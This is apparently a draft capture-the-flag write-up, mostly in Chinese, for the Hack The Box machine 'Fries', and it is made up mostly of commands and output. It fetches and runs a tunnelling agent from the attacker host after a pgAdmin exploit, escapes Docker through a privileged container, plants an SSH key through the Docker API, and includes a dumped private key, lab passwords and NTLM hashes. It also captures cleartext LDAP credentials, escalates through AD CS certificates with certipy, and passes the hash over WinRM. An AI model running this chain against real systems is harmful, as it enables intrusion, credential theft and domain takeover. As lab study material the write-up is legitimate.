---
draft: true
title: Fries
date: 2025-11-29
weight: -808
tags:
  - windows
  - hard
---

![fries_rasnk.png](fries_rasnk.png)

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://fries.htb -H "Host: FUZZ.fries.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 94ms]
:: Progress: [114442/114442] :: Job [1/1] :: 378 req/sec :: Duration: [0:04:41] :: Errors: 0 ::
```

访问 `http://code.fries.htb` 发现是Gitea应用。使用靶机给的初始账户登录：

```
user: d.cooper@fries.htb
pass: D4LE11maan!!
```

查看代码仓库，发现有一个 `http://db-mgmt05.fries.htb` 数据库服务

访问发现是 `pgAdmin 4` 数据库

并且在git的commit记录里面找到数据库连接账户

```
user: root
pass: PsqLR00tpaSS11
```


网上搜索发现有一个比较新的漏洞 `CVE-2025-2945` 找到相关 exp： https://github.com/Cycloctane/cve-2025-2945-poc

```
wget http://10.10.16.55:8081/agent
chmod +x agent
nohup ./agent -connect 10.10.16.55:11601 -ignore-cert &
```

```
cb46692a4590:/pgadmin4$ env
env
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGAPPNAME=pgAdmin 4 - CONN:821610
HOSTNAME=cb46692a4590
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/pgadmin4
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OAUTHLIB_INSECURE_TRANSPORT=1
PYTHONPATH=/pgadmin4
SHLVL=2
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

ssh爆破登录上了

```
user: svc
pass: Friesf00Ds2025!!
```


```
docker --tlsverify -H=127.0.0.1:2376 --tlscacert=ca.pem --tlscert=root-cert.pem --tlskey=root-key.pem run -it --privileged -v /:/host fries-web bash


root@b4ac81668734:/app# chroot /host
# id
uid=0(root) gid=0(root) groups=0(root)

```


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
N6f5Ox0ma1WXkAAAAIcm9vdEB3ZWIBAgM=
-----END OPENSSH PRIVATE KEY-----
```


```
# Use postgres image to add SSH key
CONTAINER_ID=$(curl -s --cert /tmp/cert/root-cert.pem --key /tmp/cert/root-key.pem --cacert /tmp/cert/ca.pem \
  -X POST -H "Content-Type: application/json" \
  "https://127.0.0.1:2376/v1.50/containers/create" \
  -d '{
    "Image": "postgres:16",
    "Entrypoint": ["/bin/bash", "-c"],
    "Cmd": ["mkdir -p /host/root/.ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCZXP7KBU1hKttyTjPsSbLEQBFwnuqJZHuRN56tK02i kali@backfire\" >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"],
    "HostConfig": {
      "Binds": ["/:/host:rw"]
    }
  }' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

echo "Container ID: $CONTAINER_ID"

curl --cert /tmp/cert/root-cert.pem --key /tmp/cert/root-key.pem --cacert /tmp/cert/ca.pem \
  -X POST "https://127.0.0.1:2376/v1.50/containers/$CONTAINER_ID/start"

sleep 3
```


```
rockon!
```


```
# sudo responder -I tun0

[LDAP] Cleartext Client   : 10.129.20.71
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d

```

```
user: svc_infra
pass: m6tneOMAh5p0wQ0d
```

```
$ nxc ldap 10.129.20.71 -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' --gmsa   
LDAP        10.129.20.71    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.129.20.71    389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
LDAP        10.129.20.71    389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.20.71    389    DC01             Account: gMSA_CA_prod$        NTLM: fc20b3d3ec179c5339ca59fbefc18f4a     PrincipalsAllowedToReadPassword: svc_infra

```

```
user: gMSA_CA_prod$
hash: fc20b3d3ec179c5339ca59fbefc18f4a
```


```
certipy-ad ca -u 'gMSA_CA_prod$@fries.htb' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -ca fries-DC01-CA -add-officer 'gMSA_CA_prod$' -dc-ip 10.129.20.71
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'


certipy-ad req -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -ca fries-DC01-CA -template SubCA -upn Administrator -dc-ip 10.129.20.71

certipy-ad ca -u 'gMSA_CA_prod$@fries.htb' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -ca fries-DC01-CA -issue-request 42 -dc-ip 10.129.20.71



certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -ca fries-DC01-CA -retrieve 41 -dc-ip 10.129.20.71


certipy-ad auth -pfx administrator.pfx -username Administrator -domain fries.htb -dc-ip 10.129.20.71
```

```
certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -ca fries-DC01-CA -template SubCA -upn Administrator -dc-ip 10.129.20.71

certipy-ad ca -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -ca fries-DC01-CA -issue-request 43 -dc-ip 10.129.20.71
```

```
# /!\ Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE

# query flags
reg.py 'fries.htb'/'gMSA_CA_prod$'@10.129.20.71 -hashes ':fc20b3d3ec179c5339ca59fbefc18f4a' query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags

# bitwise OR to set the flag if not already (nothing changed if already set)
python3 -c print("NEW_VALUE:", 1114446 | 0x40000)

# write flags
reg.py 'fries.htb'/'gMSA_CA_prod$'@10.129.20.71 -hashes ':fc20b3d3ec179c5339ca59fbefc18f4a' add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd 1376590
```


```
$ nxc winrm 10.129.20.71 -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
WINRM       10.129.20.71    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) 
WINRM       10.129.20.71    5985   DC01             [+] fries.htb\gMSA_CA_prod$:fc20b3d3ec179c5339ca59fbefc18f4a (Pwn3d!)

$ evil-winrm -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a -i 10.129.20.71
```


```
$ evil-winrm -u Administrator -H a773cb05d79273299a684a23ede56748 -i 10.129.20.71 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
258543e2065c74a2ad6f91d8f8423e9a

```